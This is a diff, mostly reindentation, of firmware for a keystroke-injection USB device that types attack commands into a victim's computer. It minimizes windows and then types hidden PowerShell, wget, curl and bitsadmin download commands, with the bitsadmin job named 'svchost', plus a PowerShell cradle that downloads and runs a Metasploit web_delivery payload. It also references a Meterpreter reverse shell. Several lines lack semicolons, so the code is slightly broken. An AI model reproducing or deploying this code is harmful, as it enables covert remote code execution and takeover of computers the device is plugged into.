@@ -104,32 +104,30 @@ const int led_pin = 13;
 
 /** blink the LED quickly **/
 void blink_fast(void) {
-  digitalWrite(led_pin, HIGH);
-  delay(100);
-  digitalWrite(led_pin, LOW);
-  delay(100);
-  }
+    digitalWrite(led_pin, HIGH);
+    delay(100);
+    digitalWrite(led_pin, LOW);
+    delay(100);
 }
 
 /** blink the LED slowly **/
 void blink_slow(void) {
-  digitalWrite(led_pin, HIGH);
-  delay(1000);
-  digitalWrite(led_pin, LOW);
-  delay(1000);
-  }
+    digitalWrite(led_pin, HIGH);
+    delay(1000);
+    digitalWrite(led_pin, LOW);
+    delay(1000);
 }
 
 /** test whether Windows is recognizing the device using the specified lock key **/
 void wait_for_drivers(void) {
-  boolean numLockTrap = isLockOn();
-  while(numLockTrap == isLockOn()) {
-      blink_fast();
-      toggleLock();
-      delay(lock_check_wait);
-  }
-  toggleLock();
-  delay(lock_check_wait);
+    boolean numLockTrap = isLockOn();
+    while(numLockTrap == isLockOn()) {
+        blink_fast();
+        toggleLock();
+        delay(lock_check_wait);
+    }
+    toggleLock();
+    delay(lock_check_wait);
 }
 
 /**
@@ -208,28 +206,28 @@ void mac_quitApp(void) {
 
 /** Download a file using wget **/
 void wget_download(void) {
-  delay(1000);
-  Keyboard.print("wget --user-agent=\"");
-  Keyboard.print(user_agent); // change the UA string
-  Keyboard.print("\" ");
-  Keyboard.print(remote_url);
-  Keyboard.print(remote_file);
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now()
-  clearKeys();
+    delay(1000);
+    Keyboard.print("wget --user-agent=\"");
+    Keyboard.print(user_agent); // change the UA string
+    Keyboard.print("\" ");
+    Keyboard.print(remote_url);
+    Keyboard.print(remote_file);
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now()
+    clearKeys();
 }
 
 /** Download a file using curl **/
 void curl_download(void) {
-  delay(1000);
-  Keyboard.print("curl -A\"");
-  Keyboard.print(user_agent); // change the UA string
-  Keyboard.print("\" ");
-  Keyboard.print(remote_url);
-  Keyboard.print(remote_file);
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  clearKeys();
+    delay(1000);
+    Keyboard.print("curl -A\"");
+    Keyboard.print(user_agent); // change the UA string
+    Keyboard.print("\" ");
+    Keyboard.print(remote_url);
+    Keyboard.print(remote_file);
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now();
+    clearKeys();
 }
 
 /**
@@ -289,28 +287,28 @@ void win_openCmd(void) {
 
 /** Download a file using BITS **/
 void bits_download(void){
-  Keyboard.print("bitsadmin.exe /transfer \"svchost\" ");
-  Keyboard.print(remote_url)
-  Keyboard.print(remote_file)
-  Keyboard.print(" ")
-  Keyboard.print("win_download_dir")
-  Keyboard.print(remote_file)
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  clearKeys();
+    Keyboard.print("bitsadmin.exe /transfer \"svchost\" ");
+    Keyboard.print(remote_url)
+    Keyboard.print(remote_file)
+    Keyboard.print(" ")
+    Keyboard.print("win_download_dir")
+    Keyboard.print(remote_file)
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now();
+   clearKeys();
 }
 
 /** Download a file using Powershell 2.0's Net.WebClient **/
 void powershell_download(void){
-  Keyboard.print("powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadFile('");
-  Keyboard.print(remote_url)
-  Keyboard.print(remote_file)
-  Keyboard.print("', '")
-  Keyboard.print(remote_file)
-  Keyboard.print("')'")
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  clearKeys();
+    Keyboard.print("powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadFile('");
+    Keyboard.print(remote_url)
+    Keyboard.print(remote_file)
+    Keyboard.print("', '")
+    Keyboard.print(remote_file)
+    Keyboard.print("')'")
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now();
+    clearKeys();
 }
 
 /**
@@ -354,25 +352,25 @@ void mac_netcat(void) {
 
 /** Windows Powershell Web Delivery script **/
 void win_pwrshllweb(void) {
-  wait_for_drivers(); // wait until device is loaded
-  blink_fast();
-  win_minWindows(); // minimize any open windows
-  // open cmd.exe
-  delay(1000);
-  win_openCmd();
-  // feed in string for Metasploit's web_delivery
-  delay(1000);
-  Keyboard.print("powershell.exe -nop -w hidden -c $k=new-object net.webclient;");
-  Keyboard.print("$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.");
-  Keyboard.print("Credentials=[Net.CredentialCache]::DefaultCredentials;IEX ");
-  Keyboard.print("$k.downloadstring('");
-  Keyboard.print(msf_web_delivery);
-  Keyboard.print("');");
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  clearKeys();
-  win_restoreWindows(); // restore previously minimized windows
-  blink_slow();
+    wait_for_drivers(); // wait until device is loaded
+    blink_fast();
+    win_minWindows(); // minimize any open windows
+    // open cmd.exe
+    delay(1000);
+    win_openCmd();
+    // feed in string for Metasploit's web_delivery
+    delay(1000);
+    Keyboard.print("powershell.exe -nop -w hidden -c $k=new-object net.webclient;");
+    Keyboard.print("$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.");
+    Keyboard.print("Credentials=[Net.CredentialCache]::DefaultCredentials;IEX ");
+    Keyboard.print("$k.downloadstring('");
+    Keyboard.print(msf_web_delivery);
+    Keyboard.print("');");
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now();
+    clearKeys();
+    win_restoreWindows(); // restore previously minimized windows
+    blink_slow();
 }
 
 /** Python Meterpreter reverse TCP **/
